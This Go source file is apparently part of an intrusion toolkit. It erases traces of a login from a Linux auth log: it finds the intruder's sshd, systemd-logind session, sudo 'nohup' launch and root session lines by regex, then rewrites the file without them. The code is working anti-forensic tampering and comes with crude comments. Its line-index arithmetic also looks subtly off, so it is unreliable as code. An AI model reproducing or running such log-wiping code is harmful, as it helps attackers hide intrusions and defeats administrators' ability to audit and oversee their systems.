package authlog

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"
	check "test/client/CHECK"
	vars "test/vars"
)

// This shit deletes auth log logs.
// Masturbation goes cloud
// var systemdLogInd string
// var sessionId string
// var indexToStartForSystemLog int
// var indexToStartManipulate int

func DeleteSessionAndSudoeSyslogAuthlog(c vars.Config, FileToDelLines string) error {
	// fmt.Println(c.Client.User, c.Flags.Pids, c.Flags.SessionId, "AAASAS")
	file, err := os.ReadFile(FileToDelLines)
	if err != nil {
		return err
	}
	stringSliceOfLogFile := strings.Split(string(file), "\n")
	patternForSSHD := fmt.Sprintf(`%s\ sshd\[(%s)\]`, c.Client.User, c.Flags.Pids)
	fmt.Println(patternForSSHD)
	re := regexp.MustCompile(patternForSSHD)
	linesToDel := []int{}
	for i, j := range stringSliceOfLogFile {
		match := re.MatchString(j)
		if match {
			fmt.Println(j, "<<<<A")
			linesToDel = append(linesToDel, i)
		}
	}

	fmt.Println(linesToDel)
	match := ""
	patternForSystemdLogind := fmt.Sprintf(`systemd-logind\[(\d+)\]:\ New\ session\ (%s)\ .*\ %s`, c.Flags.SessionId, c.Client.User)
	fmt.Println(patternForSystemdLogind)
	resId := regexp.MustCompile(patternForSystemdLogind)
	for _, j := range stringSliceOfLogFile[linesToDel[0]-2:] {
		if resId.MatchString(j) {
			match = resId.FindStringSubmatch(j)[1]

		}

	}
	fmt.Println(match)
	findAllSystemLoginId := fmt.Sprintf(`(?i)systemd-logind\[(%s)\]:.*session\ (%s).*`, match, c.Flags.SessionId)
	fmt.Println(findAllSystemLoginId)
	resSysLoginID := regexp.MustCompile(findAllSystemLoginId)
	for i, j := range stringSliceOfLogFile[linesToDel[0]-2:] {
		if resSysLoginID.MatchString(j) {
			fmt.Println(j, "<<<<A")
			linesToDel = append(linesToDel, i+linesToDel[0])
		}
	}

	// PWD=.*COMMAND=/usr/bin/nohup ./output_skata

	wd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}
	exePath, err := os.Executable()
	if err != nil {
		fmt.Println("Error:", err)
	}
	exeName := filepath.Base(exePath)

	lastLine := fmt.Sprintf(`PWD=%s.*COMMAND=/usr/bin/nohup ./%s`, wd, exeName)
	fmt.Println(lastLine)
	resLastLine := regexp.MustCompile(lastLine)

	for i, j := range stringSliceOfLogFile[linesToDel[0]-2:] {
		if resLastLine.MatchString(j) {
			fmt.Println(j, "<<<<A")
			linesToDel = append(linesToDel, i+linesToDel[0])
		}
	}

	sessionOpenClose := "session (opened|closed) for user root"
	fmt.Println(sessionOpenClose)
	sOC := regexp.MustCompile(sessionOpenClose)
	for i, j := range stringSliceOfLogFile[linesToDel[0]-2:] {
		if sOC.MatchString(j) {
			fmt.Println(j, "<<<<A")
			linesToDel = append(linesToDel, i+linesToDel[0])
		}
	}
	sort.Sort(sort.Reverse(sort.IntSlice(linesToDel)))
	fmt.Println(linesToDel)

	for _, j := range linesToDel {
		stringSliceOfLogFile = Remove(stringSliceOfLogFile, j)
	}

	err = CopyFile(FileToDelLines, stringSliceOfLogFile)
	if err != nil {
		check.Check("error on Coping File at auth log", err)
	}
	return nil

}

func Remove(slice []string, index int) []string {
	if index < 0 || index >= len(slice) {
		fmt.Println("Index out of range")
		return slice
	}
	return append(slice[:index], slice[index+1:]...)
}

func CopyFile(filepath string, strings []string) error {

	file, err := os.OpenFile(filepath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	check.Check("Error on Open File", err)
	defer file.Close()

	for _, j := range strings {
		_, err := file.WriteString(j + "\n")
		check.Check("Error on Writing File ", err)
	}

	fmt.Println("All strings written to file successfully")
	return nil
}
